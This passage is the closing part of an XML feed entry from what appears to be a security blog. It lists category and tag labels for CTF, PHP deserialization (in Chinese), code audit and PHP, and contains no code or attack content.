      <category term="CTF" scheme="http://yoursite.com/categories/CTF/"/>
    
      <category term="PHP反序列化" scheme="http://yoursite.com/categories/CTF/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
    
      <category term="代码审计" scheme="http://yoursite.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
      <category term="PHP" scheme="http://yoursite.com/tags/PHP/"/>
    
  </entry>
  
</feed>
